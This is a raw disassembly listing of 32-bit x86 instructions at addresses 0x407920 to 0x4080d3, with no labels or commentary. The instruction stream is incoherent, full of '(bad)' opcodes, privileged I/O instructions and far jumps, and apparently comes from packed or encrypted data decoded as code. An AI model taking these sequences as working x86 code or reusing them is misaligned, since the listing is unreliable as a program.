  407920:	push   es
  407921:	fnop   
  407923:	(bad)  
  407924:	rol    BYTE PTR [edi-0x13],1
  407927:	ins    BYTE PTR es:[edi],dx
  407928:	mov    esi,0x24089460
  40792d:	fcom   QWORD PTR [edi-0x15]
  407930:	outs   dx,DWORD PTR ds:[esi]
  407931:	jl     0x40795b
  407933:	or     bl,BYTE PTR ds:0xf644acd5
  407939:	into   
  40793a:	jl     0x407982
  40793c:	outs   dx,DWORD PTR ds:[esi]
  40793d:	dec    eax
  40793e:	sbb    bl,bl
  407940:	cdq    
  407941:	cmp    bl,cl
  407943:	push   ebx
  407944:	sbb    esp,DWORD PTR [edi-0x2e]
  407947:	fild   DWORD PTR [edi-0x26]
  40794a:	or     ebp,edx
  40794c:	inc    ecx
  40794d:	sbb    al,0xd4
  40794f:	je     0x407919
  407951:	arpl   WORD PTR [edi+0x36],bx
  407954:	dec    bx
  407956:	fwait
  407957:	xchg   edi,eax
  407958:	data16 and al,0xa2
  40795b:	xor    esp,DWORD PTR [ecx+0x3091b65e]
  407961:	or     esi,ebx
  407963:	pushf  
  407964:	outs   dx,BYTE PTR ds:[esi]
  407965:	dec    edi
  407966:	dec    ecx
  407967:	or     al,0x0
  407969:	aaa    
  40796a:	xchg   eax,edx
  40796c:	dec    ecx
  40796d:	or     al,0xfa
  40796f:	scas   al,BYTE PTR es:[edi]
  407970:	cmp    ch,BYTE PTR [ecx+0x58]
  407973:	adc    DWORD PTR [esi+0x46c9c390],0xb9206a4
  40797d:	mov    ds:0x1ffe7f55,al
  407982:	xchg   DWORD PTR [edi+edi*1-0x7c],edi
  407986:	mov    al,ds:0x4a3c96d9
  40798b:	or     eax,0x2fa84f29
  407990:	push   0xb880f72e
  407995:	mov    cl,0x63
  407997:	ds and al,0x8b
  40799a:	add    DWORD PTR [esi],ebx
  40799c:	bound  esp,QWORD PTR [edx-0x20]
  40799f:	mov    ds:0xc98ec0a0,al
  4079a4:	clc    
  4079a5:	jae    0x407947
  4079a7:	mov    ecx,0xb14cad74
  4079ac:	enter  0x80ed,0x24
  4079b0:	mov    edi,0x871bc26f
  4079b5:	cmp    edx,DWORD PTR [ecx+0x14abee27]
  4079bb:	iret   
  4079bc:	int    0x30
  4079be:	(bad)  
  4079bf:	mov    ebx,0x235f56b6
  4079c4:	ins    BYTE PTR es:[edi],dx
  4079c5:	(bad)  [edx]
  4079c7:	lds    ebp,FWORD PTR [edi-0x64]
  4079ca:	adc    DWORD PTR [ecx],esp
  4079cc:	std    
  4079cd:	aaa    
  4079ce:	mov    esi,0x52ce1a76
  4079d3:	push   cs
  4079d4:	rcr    al,0xad
  4079d7:	loop   0x4079ed
  4079d9:	dec    eax
  4079da:	(bad)  
  4079db:	push   ecx
  4079dc:	sub    DWORD PTR [ecx+0x6cfacd09],edx
  4079e2:	sub    cl,BYTE PTR [ebx]
  4079e4:	push   edi
  4079e5:	nop
  4079e6:	je     0x4079e2
  4079e8:	mov    ebx,0xd8d0b355
  4079ed:	retf   0xce1f
  4079f0:	mov    ?,WORD PTR [esi+0x390b1302]
  4079f6:	xchg   ebx,eax
  4079f7:	xchg   BYTE PTR [edi-0x8],ch
  4079fa:	dec    DWORD PTR ds:0xe68824d4
  407a00:	(bad)  
  407a02:	sbb    BYTE PTR [eax+edx*4],ch
  407a05:	loope  0x407a4e
  407a07:	sahf   
  407a08:	add    dl,ah
  407a0a:	jl     0x4079a8
  407a0c:	not    DWORD PTR ds:0x1a1b5d2d
  407a12:	mov    ebx,0x3c63f1bb
  407a17:	fxch   st(5)
  407a19:	retf   0x40bd
  407a1c:	arpl   WORD PTR [ebp+0x5b],si
  407a1f:	sahf   
  407a20:	inc    edx
  407a21:	mov    ah,0xf1
  407a23:	or     al,0x44
  407a25:	fcomp  QWORD PTR [edx]
  407a27:	ss inc eax
  407a29:	xchg   esi,eax
  407a2a:	push   ss
  407a2b:	pop    edx
  407a2c:	dec    edi
  407a2d:	inc    edi
  407a2e:	add    eax,0xebc1e1dd
  407a33:	test   al,0x10
  407a35:	add    eax,0x92880e17
  407a3a:	mov    ds:0x872afed6,al
  407a3f:	mov    esi,0xae2c90ce
  407a44:	cmp    al,0x1d
  407a46:	enter  0x673c,0xea
  407a4a:	cmp    eax,0xe7aaa1f0
  407a4f:	aaa    
  407a50:	pushf  
  407a51:	push   edx
  407a52:	push   edi
  407a53:	mov    BYTE PTR [eax],bh
  407a55:	out    dx,eax
  407a56:	mov    esp,0x48149c5c
  407a5b:	ss stos BYTE PTR es:[edi],al
  407a5d:	into   
  407a5e:	pop    ecx
  407a5f:	push   eax
  407a60:	mov    cl,0x92
  407a62:	sub    dl,BYTE PTR [ecx]
  407a64:	inc    ecx
  407a65:	out    0x2d,al
  407a67:	(bad)  
  407a68:	dec    ebp
  407a69:	ja     0x407ac9
  407a6b:	arpl   WORD PTR [edi+0x48],bx
  407a6e:	jmpw   0xe1bf
  407a72:	jg     0x407a84
  407a74:	std    
  407a75:	mov    esi,0x900cd654
  407a7a:	adc    bh,BYTE PTR [edi]
  407a7c:	mov    esp,DWORD PTR [edx+0x15]
  407a7f:	push   0x34ef775a
  407a84:	sbb    al,0x5
  407a86:	enter  0x5295,0x98
  407a8a:	mov    eax,ds:0xdf64d5f4
  407a8f:	xor    BYTE PTR [eax],dh
  407a91:	dec    ebx
  407a92:	retf   
  407a93:	bnd jge 0x407a3a
  407a96:	ficomp DWORD PTR ds:0x9febd9de
  407a9c:	dec    ebx
  407a9d:	int    0xf0
  407a9f:	or     esi,ebp
  407aa1:	jne    0x407a93
  407aa3:	mov    edx,0xe3096aec
  407aa8:	and    eax,0xc01807a6
  407aad:	mov    ebp,0xd722c383
  407ab2:	test   BYTE PTR [ecx],cl
  407ab4:	or     eax,0x80346333
  407ab9:	or     ah,BYTE PTR [edx-0x1b2dfa05]
  407abf:	xor    BYTE PTR [edx-0x54715415],0x8e
  407ac6:	(bad)  
  407ac7:	js     0x407ae9
  407ac9:	adc    edx,ecx
  407acb:	mov    ebp,0x6453e1d7
  407ad0:	call   0xe5d0:0x5e8de5f6
  407ad7:	aaa    
  407ad8:	outs   dx,DWORD PTR ds:[esi]
  407ad9:	in     eax,0x4e
  407adb:	pop    edi
  407adc:	mov    dl,0xc
  407ade:	sbb    al,0x27
  407ae0:	adc    DWORD PTR ds:[edi+eiz*2],ecx
  407ae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ae5:	jle    0x407b44
  407ae7:	inc    ecx
  407ae8:	mov    BYTE PTR [ecx-0x61a4b09e],ah
  407aee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407aef:	jg     0x407ae8
  407af1:	and    esp,DWORD PTR [esi+0x2bca98b6]
  407af7:	out    0x3c,al
  407af9:	mov    eax,0x4333e13e
  407afe:	xchg   ebp,eax
  407aff:	xchg   esi,eax
  407b00:	pop    edx
  407b01:	jb     0x407a9c
  407b03:	enter  0xb496,0x7e
  407b07:	shl    DWORD PTR [ecx+0x67ea4541],0x31
  407b0e:	clc    
  407b0f:	aaa    
  407b10:	inc    ebp
  407b11:	stos   DWORD PTR es:[edi],eax
  407b12:	rol    BYTE PTR [edx-0x90455be],1
  407b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b19:	inc    ecx
  407b1a:	repz pusha 
  407b1c:	mov    al,ds:0x187c5d0d
  407b21:	and    eax,0xdff9f2c0
  407b26:	pop    es
  407b27:	mov    ch,BYTE PTR ds:0x3385b887
  407b2d:	adc    edx,DWORD PTR [edx+eiz*1+0x6a582725]
  407b34:	pop    ecx
  407b35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b36:	(bad)  
  407b37:	lahf   
  407b38:	test   eax,0xa7229c28
  407b3d:	gs ja  0x407b20
  407b40:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  407b42:	adc    eax,0x44e1f897
  407b47:	cmp    al,0xe2
  407b49:	add    al,ah
  407b4b:	sub    DWORD PTR [ebp-0x28],esp
  407b4e:	pop    eax
  407b4f:	scas   al,BYTE PTR es:[edi]
  407b50:	add    dl,BYTE PTR [ebp-0x461eabb8]
  407b56:	rcl    DWORD PTR [edx+0x4f],1
  407b59:	mov    bh,0xff
  407b5b:	ja     0x407b66
  407b5d:	rcl    BYTE PTR [ebp+0x1a48489b],cl
  407b63:	ja     0x407b1f
  407b65:	sahf   
  407b66:	xchg   edi,eax
  407b67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b68:	pop    esi
  407b69:	jle    0x407b83
  407b6b:	xchg   ebp,eax
  407b6c:	cmc    
  407b6d:	sbb    al,0xbc
  407b6f:	repnz das 
  407b71:	xor    bl,dl
  407b73:	sbb    DWORD PTR [eax+eax*1],edi
  407b76:	jge    0x407bed
  407b78:	sar    esp,cl
  407b7a:	fcomp  QWORD PTR [ecx]
  407b7c:	sbb    esp,DWORD PTR [edi+ecx*2+0x5b9064e7]
  407b83:	sub    edi,esi
  407b85:	fidivr DWORD PTR [edx-0x69432c69]
  407b8b:	xor    al,0x76
  407b8d:	lahf   
  407b8e:	add    esi,DWORD PTR [ebx-0x1]
  407b91:	cmp    ah,bl
  407b93:	push   cs
  407b94:	sbb    DWORD PTR [eax+0x30185f18],ecx
  407b9a:	jmp    0x876736ab
  407b9f:	mov    ss:0xdb03de96,al
  407ba5:	sbb    eax,0x2a80b1cb
  407baa:	mov    bh,0xfa
  407bac:	jge    0x407bad
  407bae:	mov    cl,0xc8
  407bb0:	mov    DWORD PTR [ebp+0x53],edi
  407bb3:	sub    al,0xd4
  407bb5:	adc    ebx,DWORD PTR [edi+0x2708bad8]
  407bbb:	push   edi
  407bbc:	lahf   
  407bbd:	ret    
  407bbe:	inc    esi
  407bbf:	cmp    bl,BYTE PTR [esi+0x60b05dd6]
  407bc5:	dec    ebp
  407bc6:	jg     0x407b54
  407bc8:	xchg   ecx,eax
  407bc9:	push   ecx
  407bca:	loope  0x407b8f
  407bcc:	dec    edi
  407bcd:	mov    ch,0x2a
  407bcf:	mov    bh,0xb
  407bd1:	outs   dx,DWORD PTR ds:[esi]
  407bd2:	les    edi,FWORD PTR [eax-0x4a748855]
  407bd8:	clc    
  407bd9:	(bad)  
  407bdb:	icebp  
  407bdc:	cli    
  407bdd:	jmp    0x7a26:0x538c3ab0
  407be4:	push   ecx
  407be5:	jno    0x407bff
  407be7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407be8:	sbb    ah,dl
  407bea:	adc    DWORD PTR [edx+0x77],esi
  407bed:	mov    dh,0xf6
  407bef:	push   ss
  407bf0:	jo     0x407c6e
  407bf2:	hlt    
  407bf3:	add    eax,0xe0daafd6
  407bf8:	repnz sbb DWORD PTR [edx],0x34
  407bfc:	es js  0x407bab
  407bff:	add    bh,BYTE PTR [edx-0x1916164d]
  407c05:	and    eax,0x62f65ad4
  407c0a:	pop    edx
  407c0b:	fnstsw WORD PTR [ecx-0x37704c1d]
  407c11:	shl    BYTE PTR [edi],1
  407c13:	stos   BYTE PTR es:[edi],al
  407c14:	pop    ebp
  407c15:	sub    eax,0xcd21fc4b
  407c1a:	sub    ch,BYTE PTR [ebp-0x4e]
  407c1d:	test   DWORD PTR [ecx-0x9e5e5ef],ebx
  407c23:	shl    BYTE PTR [edi+0x5cfb1001],1
  407c29:	and    ebx,DWORD PTR es:[ebx+0x7a77478a]
  407c30:	in     eax,0xa3
  407c32:	push   edx
  407c33:	push   ebp
  407c34:	push   ecx
  407c35:	add    BYTE PTR [esi-0x34],al
  407c38:	int    0xcc
  407c3a:	sbb    esp,DWORD PTR [esi]
  407c3c:	sbb    DWORD PTR fs:[eax+0xa9f2d4],ebx
  407c43:	adc    al,0x1d
  407c45:	xchg   ebx,eax
  407c46:	mov    ds:0x92d9bb07,eax
  407c4b:	or     esp,DWORD PTR [ebx-0x4a]
  407c4e:	mov    ch,0xf0
  407c50:	cwde   
  407c51:	push   edx
  407c52:	add    eax,0x38d02090
  407c57:	(bad)  
  407c58:	and    al,bl
  407c5a:	imul   ebp
  407c5c:	outs   dx,DWORD PTR ds:[esi]
  407c5d:	xchg   DWORD PTR fs:[ebx],edx
  407c60:	push   eax
  407c61:	fistp  QWORD PTR [ebx]
  407c63:	pop    edi
  407c64:	mov    esi,0xa87194fe
  407c69:	pop    ss
  407c6a:	icebp  
  407c6b:	sub    dh,ch
  407c6d:	mov    eax,0x618d3174
  407c72:	adc    al,BYTE PTR [ecx]
  407c74:	xor    ebp,edi
  407c76:	cwde   
  407c77:	pop    ebx
  407c78:	push   ebx
  407c79:	cli    
  407c7a:	mov    cl,0xdc
  407c7c:	jno    0x407cf9
  407c7e:	mov    bl,0x9e
  407c80:	stos   BYTE PTR es:[edi],al
  407c81:	pop    ecx
  407c82:	(bad)  
  407c83:	xchg   ebp,eax
  407c84:	jb     0x407c50
  407c86:	push   eax
  407c87:	test   ch,dl
  407c89:	xchg   BYTE PTR [ebp-0x30a88421],dl
  407c8f:	xor    DWORD PTR [esi+ebp*4],ebx
  407c92:	push   ds
  407c93:	lods   al,BYTE PTR ds:[esi]
  407c94:	int    0x1d
  407c96:	out    0x74,eax
  407c98:	or     ecx,DWORD PTR [ecx+ecx*2-0x6d02d0b]
  407c9f:	in     eax,0xba
  407ca1:	push   edx
  407ca2:	cmp    DWORD PTR [eax-0x40],esp
  407ca5:	sub    al,0x3b
  407ca7:	xchg   ecx,eax
  407ca8:	loopne 0x407c46
  407caa:	cmp    al,0x68
  407cac:	fisubr DWORD PTR [ebp+0x1f]
  407caf:	popa   
  407cb0:	cmp    DWORD PTR [esi+edi*1-0x66],0xee99c572
  407cb8:	inc    ebp
  407cb9:	xor    BYTE PTR [edi-0xb44eefe],0x6
  407cc0:	mov    al,0x6a
  407cc2:	imul   edi,DWORD PTR [esi+0x6e3937ad],0xffffff88
  407cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cca:	jle    0x407d18
  407ccc:	jmp    0x5daa6adc
  407cd1:	ret    0xe53c
  407cd4:	and    al,0x9d
  407cd6:	push   esp
  407cd7:	or     bh,BYTE PTR [edx-0x36b2802]
  407cdd:	and    dh,dh
  407cdf:	inc    ebx
  407ce0:	les    esi,FWORD PTR [edi+0x27a0c152]
  407ce6:	sbb    DWORD PTR [ecx+0x139f77a2],ebx
  407cec:	mov    DWORD PTR [esi-0x23],ecx
  407cef:	int    0x89
  407cf1:	daa    
  407cf2:	inc    edi
  407cf3:	lahf   
  407cf4:	dec    ebx
  407cf5:	out    dx,al
  407cf6:	mov    al,0xe2
  407cf8:	mov    WORD PTR [eax+ecx*1+0x66823d12],gs
  407cff:	dec    BYTE PTR [eax-0x691a4745]
  407d05:	popa   
  407d06:	mul    DWORD PTR [esp+ebx*8]
  407d09:	mov    ebx,0x26eb1357
  407d0e:	adc    al,0x35
  407d10:	or     eax,0xa31de324
  407d15:	shl    ecx,0xe3
  407d18:	jns    0x407d88
  407d1a:	xor    BYTE PTR [esi+0x391257ae],ah
  407d20:	cdq    
  407d21:	push   es
  407d22:	(bad)  
  407d23:	out    0xe1,al
  407d25:	sbb    dh,bl
  407d27:	push   ebx
  407d28:	inc    esp
  407d29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d2a:	mov    esp,0x33177217
  407d2f:	push   edx
  407d30:	cs stos BYTE PTR es:[edi],al
  407d32:	in     al,dx
  407d33:	add    edx,DWORD PTR [esi-0x78]
  407d36:	mov    ecx,0x9c058fbb
  407d3b:	mov    al,ds:0xa5d24a9f
  407d40:	dec    ebp
  407d41:	push   cs
  407d42:	rcr    BYTE PTR [edx],0x1e
  407d45:	dec    ebx
  407d46:	push   ds
  407d47:	push   ecx
  407d48:	sub    eax,0xf6ad12b4
  407d4d:	xchg   ecx,eax
  407d4e:	in     al,dx
  407d4f:	sti    
  407d50:	sti    
  407d51:	ror    BYTE PTR [ebp+0x2633fde8],0xb3
  407d58:	loop   0x407d4b
  407d5a:	rcl    BYTE PTR [eax-0x50],1
  407d5d:	(bad)  
  407d5e:	sbb    eax,0xb34ff15b
  407d63:	les    edx,FWORD PTR [edi-0x21]
  407d66:	sbb    eax,0xf8a6f394
  407d6b:	xchg   edx,eax
  407d6c:	sar    DWORD PTR [edi],cl
  407d6e:	mov    ch,0x2e
  407d70:	mov    ebp,?
  407d72:	mov    fs,WORD PTR [ebp-0x7a]
  407d75:	pop    ds
  407d76:	arpl   WORD PTR [ebp-0x49],ax
  407d79:	mov    cl,0x37
  407d7b:	je     0x407d62
  407d7d:	popa   
  407d7e:	mov    eax,0xa2fafe23
  407d83:	ins    DWORD PTR es:[edi],dx
  407d84:	push   edx
  407d85:	sbb    ebp,DWORD PTR [ebp+ebp*4-0x4c]
  407d89:	rcr    bl,cl
  407d8b:	push   0xfbd2fef3
  407d90:	xchg   ebx,eax
  407d91:	imul   esp,esp,0x21
  407d94:	je     0x407e00
  407d96:	mov    ebp,0x60271a3c
  407d9b:	out    0xc,al
  407d9d:	inc    DWORD PTR [ebp+0x5b]
  407da0:	xchg   esp,eax
  407da1:	pop    esp
  407da2:	hlt    
  407da3:	mov    ah,BYTE PTR [esi+0x1f8e5654]
  407da9:	pop    ss
  407daa:	cmp    eax,0x56094543
  407daf:	sub    eax,0x9bfb7013
  407db4:	fdiv   DWORD PTR [eax]
  407db6:	call   DWORD PTR [esp+ebp*1+0x4d6a9af9]
  407dbd:	mov    al,0x40
  407dbf:	or     DWORD PTR [esi+0x7e863411],eax
  407dc5:	repz xchg esp,eax
  407dc7:	(bad)  [edi+0x63]
  407dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dcb:	or     DWORD PTR [ebx+ebx*2-0x30],esp
  407dcf:	stc    
  407dd0:	fucomip st,st(3)
  407dd2:	cli    
  407dd3:	rcr    WORD PTR [edx+0x4],0xd9
  407dd8:	cmp    DWORD PTR [edi-0x11],ebx
  407ddb:	pop    ebx
  407ddc:	mov    ch,0x9b
  407dde:	mov    al,dh
  407de0:	fidivr WORD PTR [edi]
  407de2:	rcl    dh,1
  407de4:	inc    ecx
  407de5:	retf   
  407de6:	mov    dl,0x2f
  407de8:	cli    
  407de9:	bound  esp,QWORD PTR [edi]
  407deb:	call   0x3532:0x8649b160
  407df2:	dec    ecx
  407df3:	leave  
  407df4:	xchg   esp,eax
  407df5:	push   0xffffffc1
  407df7:	sahf   
  407df8:	xor    BYTE PTR [ecx*4-0x7c2755fa],cl
  407dff:	dec    ebx
  407e01:	repz in eax,0x28
  407e04:	test   BYTE PTR [ecx+0xc],ch
  407e07:	push   ebp
  407e08:	cmc    
  407e09:	add    al,0x2a
  407e0b:	cmp    BYTE PTR ds:0x4ce0e555,al
  407e11:	into   
  407e12:	dec    esp
  407e13:	cmp    bl,BYTE PTR [ecx-0x43]
  407e16:	mov    ebx,0x62823ca1
  407e1b:	and    eax,0x159d16db
  407e20:	push   ebp
  407e21:	nop
  407e22:	inc    ebx
  407e23:	ins    DWORD PTR es:[edi],dx
  407e24:	pop    ds
  407e25:	cld    
  407e26:	jge    0x407e68
  407e28:	(bad)  
  407e29:	mov    WORD PTR [edi+0x6a46f8a1],es
  407e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e30:	cmc    
  407e31:	(bad)  
  407e32:	iret   
  407e33:	inc    ebp
  407e34:	xchg   ebx,eax
  407e35:	xor    al,0xfb
  407e37:	lods   al,BYTE PTR ds:[esi]
  407e38:	in     eax,0xb4
  407e3a:	dec    edi
  407e3b:	gs xor eax,0x7ce886c4
  407e41:	add    al,0xe6
  407e43:	inc    ecx
  407e44:	xor    bh,BYTE PTR [esi-0x2c]
  407e47:	adc    esi,esi
  407e49:	(bad)  
  407e4a:	lods   al,BYTE PTR gs:[esi]
  407e4c:	xchg   esp,eax
  407e4d:	popa   
  407e4e:	sbb    ebp,eax
  407e50:	dec    esp
  407e51:	jae    0x407e5e
  407e53:	mov    ebx,0x583441a8
  407e58:	add    al,0x83
  407e5a:	jnp    0x407ddf
  407e5c:	xor    ecx,esi
  407e5e:	mov    eax,ds:0x9047814c
  407e63:	or     DWORD PTR [edx],0x49
  407e66:	jo     0x407e87
  407e68:	push   ss
  407e69:	daa    
  407e6a:	shl    bh,1
  407e6c:	pop    ds
  407e6d:	jae    0x407e07
  407e6f:	pop    edi
  407e70:	lea    ebx,[ecx+0xa7a3558]
  407e76:	popa   
  407e77:	lods   eax,DWORD PTR ds:[esi]
  407e78:	pop    ecx
  407e79:	rol    BYTE PTR [ebx-0x71],0xc9
  407e7d:	sub    bh,BYTE PTR [ebx-0x44]
  407e80:	inc    esp
  407e81:	mov    edx,0x73632df7
  407e86:	pop    ecx
  407e87:	push   ebx
  407e88:	cmp    dh,BYTE PTR [ecx+0x10]
  407e8b:	sbb    eax,0x15c04d4f
  407e90:	ins    BYTE PTR es:[edi],dx
  407e91:	sbb    ebx,ecx
  407e93:	imul   edx,DWORD PTR [ecx+esi*8+0x7085745f],0x6b7fcc3b
  407e9e:	xor    BYTE PTR ds:0xc5341eb4,dl
  407ea4:	into   
  407ea5:	adc    bl,al
  407ea7:	adc    BYTE PTR [ebx+eiz*2+0xe],cl
  407eab:	rcl    cl,0x2d
  407eae:	and    DWORD PTR [eax-0x46],edi
  407eb1:	cld    
  407eb2:	adc    ch,cl
  407eb4:	aaa    
  407eb5:	push   ebp
  407eb6:	mov    dh,0x35
  407eb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407eb9:	dec    eax
  407eba:	mov    dx,0xe267
  407ebe:	xchg   ebx,eax
  407ebf:	xchg   DWORD PTR [ecx-0x13],edx
  407ec2:	jbe    0x407f39
  407ec4:	xchg   edx,eax
  407ec5:	mov    al,ds:0xebc970
  407eca:	cwde   
  407ecb:	loopne 0x407f0a
  407ecd:	xor    eax,0x30449b9c
  407ed2:	test   eax,0x9b510ec6
  407ed7:	cs and eax,0xcb5534a3
  407edd:	outs   dx,BYTE PTR ds:[esi]
  407ede:	lahf   
  407edf:	jmp    0x407f31
  407ee1:	sahf   
  407ee2:	(bad)  
  407ee3:	retf   
  407ee4:	mov    dh,0x20
  407ee6:	pop    ds
  407ee7:	in     eax,0xb4
  407ee9:	adc    DWORD PTR [edx-0x35],edi
  407eec:	dec    ebx
  407eed:	mov    DWORD PTR [edi-0x24],0x25962a35
  407ef4:	daa    
  407ef5:	dec    ebx
  407ef6:	sti    
  407ef7:	sub    al,0xec
  407ef9:	ins    BYTE PTR es:[edi],dx
  407efa:	icebp  
  407efb:	push   edx
  407efc:	mov    dl,0x6b
  407efe:	jmp    0x55e8e53f
  407f03:	ins    DWORD PTR es:[edi],dx
  407f04:	jecxz  0x407e97
  407f06:	rol    BYTE PTR [esi+edx*4+0xdcb0b0b],cl
  407f0d:	hlt    
  407f0e:	push   0x3b
  407f10:	fcomp  st(2)
  407f12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f13:	or     esi,DWORD PTR [ebx+edx*4]
  407f16:	das    
  407f17:	sub    ch,al
  407f19:	mov    ah,0x95
  407f1b:	mov    al,0x48
  407f1d:	icebp  
  407f1e:	neg    DWORD PTR [eax-0x5e]
  407f21:	mov    DWORD PTR [edi+0x61f6fdda],esp
  407f27:	mov    ch,0x56
  407f29:	outs   dx,BYTE PTR ds:[esi]
  407f2a:	push   DWORD PTR ds:0xdec88cbd
  407f30:	jnp    0x407f2d
  407f32:	xchg   dl,bh
  407f34:	mov    esp,0x6782c547
  407f39:	add    eax,0xb72f476f
  407f3e:	mov    bh,0x5b
  407f40:	hlt    
  407f41:	out    dx,al
  407f42:	rdtsc  
  407f44:	(bad)  
  407f45:	scas   al,BYTE PTR es:[edi]
  407f46:	pusha  
  407f47:	add    bl,dh
  407f49:	shr    BYTE PTR [ebp-0x2d96fddc],cl
  407f4f:	push   esp
  407f50:	ja     0x407ed6
  407f52:	cmp    al,0x4a
  407f54:	mov    ebx,0x485bcf83
  407f59:	les    ebp,FWORD PTR [eax-0xf4fc79d]
  407f5f:	sub    esi,DWORD PTR [ecx-0x63]
  407f62:	add    eax,0xc7c78fa5
  407f67:	add    dh,BYTE PTR [esi]
  407f69:	into   
  407f6a:	push   eax
  407f6b:	pop    edx
  407f6c:	add    edi,DWORD PTR [edx+0x26]
  407f6f:	or     bl,BYTE PTR [ecx+0x5f]
  407f72:	dec    esi
  407f73:	inc    BYTE PTR [ecx+esi*1-0x43]
  407f77:	ficom  WORD PTR ds:0x2f423f50
  407f7d:	sar    DWORD PTR [edi-0x4e19c0e0],0x79
  407f84:	or     al,0x44
  407f86:	add    eax,0xd2c4a2c1
  407f8b:	hlt    
  407f8c:	cmp    DWORD PTR [ebp+0x35],eax
  407f8f:	aam    0x45
  407f91:	(bad)  
  407f92:	and    eax,0xdcb8e516
  407f97:	xor    cl,BYTE PTR [ebx+0x61]
  407f9a:	out    0xb0,al
  407f9c:	and    eax,0x62c99469
  407fa1:	stos   DWORD PTR es:[edi],eax
  407fa2:	outs   dx,DWORD PTR ds:[esi]
  407fa3:	mov    edi,0xcf0f8e12
  407fa8:	mov    bl,0x85
  407faa:	pop    ss
  407fab:	rcl    DWORD PTR [ecx-0x19],1
  407fae:	outs   dx,BYTE PTR ds:[esi]
  407faf:	addr16 jo 0x407f56
  407fb2:	fisttp WORD PTR [esi]
  407fb4:	scas   eax,DWORD PTR es:[edi]
  407fb5:	(bad)  
  407fb6:	xor    DWORD PTR [edi-0x50bb351b],esp
  407fbc:	or     eax,0x5ec3f8b1
  407fc1:	fdivr  st(1),st
  407fc3:	push   cs
  407fc4:	add    BYTE PTR es:[ebx+0x1a2497a0],cl
  407fcb:	jnp    0x408005
  407fcd:	lds    ebx,FWORD PTR [edi-0xc]
  407fd0:	xchg   DWORD PTR [eax+ecx*8],esi
  407fd3:	xchg   esi,eax
  407fd4:	mov    ah,0xfa
  407fd6:	push   ebp
  407fd7:	mov    esp,0x5ae94807
  407fdc:	add    esi,DWORD PTR [ebp+edx*2+0x7550185a]
  407fe3:	push   esp
  407fe4:	ins    DWORD PTR es:[edi],dx
  407fe5:	adc    ah,BYTE PTR [ebp+eiz*2+0x55a8678c]
  407fec:	push   0x75
  407fee:	jl     0x407f9f
  407ff0:	inc    ecx
  407ff1:	js     0x408069
  407ff3:	arpl   bp,ax
  407ff5:	test   edx,ebp
  407ff7:	push   ecx
  407ff8:	pop    esp
  407ff9:	sbb    ch,ah
  407ffb:	pop    ebx
  407ffc:	dec    edi
  407ffd:	mov    al,ds:0x741346f2
  408002:	xor    dh,dh
  408004:	pop    edx
  408005:	std    
  408006:	push   DWORD PTR [ebx+0x21164a51]
  40800c:	in     eax,dx
  40800d:	dec    esp
  40800e:	loopne 0x407fd3
  408010:	mov    al,0x18
  408012:	adc    al,0x34
  408014:	mov    dh,0xfc
  408016:	scas   eax,DWORD PTR es:[edi]
  408017:	mov    esp,0x67cd8bc0
  40801c:	dec    ebx
  40801d:	sub    eax,0xcedc4bbc
  408022:	add    ax,0xbd34
  408026:	pop    ss
  408027:	push   esp
  408028:	dec    ebp
  408029:	fwait
  40802a:	jb     0x40807f
  40802c:	inc    edx
  40802d:	rcl    BYTE PTR [esi],1
  40802f:	jae    0x4080af
  408031:	jle    0x407fc0
  408033:	jl     0x4080a0
  408035:	fsub   DWORD PTR [edi+0x1b0b4b0c]
  40803b:	cmp    cl,BYTE PTR [esi-0x7]
  40803e:	sub    cl,BYTE PTR [ecx+ecx*4]
  408041:	(bad)  
  408042:	retf   
  408043:	out    dx,eax
  408044:	scas   eax,DWORD PTR es:[edi]
  408045:	out    dx,al
  408046:	jmp    0x40801f
  408048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408049:	(bad)  
  40804a:	sub    eax,ebx
  40804c:	push   edx
  40804d:	test   DWORD PTR [eax-0x73],ebp
  408050:	repz add al,0x97
  408053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408054:	push   ecx
  408055:	imul   edi,DWORD PTR [ebx+0x409fe7be],0x707e59d1
  40805f:	xor    esp,esi
  408061:	jns    0x40806d
  408063:	push   edi
  408064:	mov    dl,0xfb
  408066:	pushf  
  408067:	fcomp  DWORD PTR [edi-0x6c70f29e]
  40806d:	inc    eax
  40806e:	(bad)  
  40806f:	call   0x3b40:0xc47076fb
  408076:	popa   
  408077:	int    0xdb
  408079:	fdivrp st(1),st
  40807b:	shl    cl,cl
  40807d:	lahf   
  40807e:	(bad)  
  40807f:	mov    al,ds:0xfde8adaa
  408084:	neg    BYTE PTR [ecx+0x12b72316]
  40808a:	in     al,0x6b
  40808c:	lahf   
  40808d:	adc    esp,DWORD PTR [edi-0x49a7f703]
  408093:	js     0x4080ed
  408095:	xchg   edx,eax
  408096:	scas   al,BYTE PTR es:[edi]
  408097:	mov    al,ds:0x9e8f3b1e
  40809c:	mov    edi,0xf12bdb86
  4080a1:	and    eax,0xf5786760
  4080a6:	mov    esi,0x836ac699
  4080ab:	cmp    bl,ah
  4080ad:	in     al,dx
  4080ae:	cmp    al,0x4d
  4080b0:	xor    eax,0x575b63ad
  4080b5:	pop    ebx
  4080b6:	mov    dh,0x7d
  4080b8:	popa   
  4080b9:	test   al,0xe4
  4080bb:	ds dec ecx
  4080bd:	stc    
  4080be:	sub    dl,al
  4080c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080c1:	or     BYTE PTR [eax-0x6c],cl
  4080c4:	mov    BYTE PTR [ebx],ah
  4080c6:	pop    ss
  4080c7:	jl     0x408109
  4080c9:	hlt    
  4080ca:	xchg   ebp,eax
  4080cb:	mov    BYTE PTR [ebp-0x72],bl
  4080ce:	pop    esi
  4080cf:	leave  
  4080d0:	push   ss
  4080d1:	(bad)  
  4080d3:	loope  0x408150
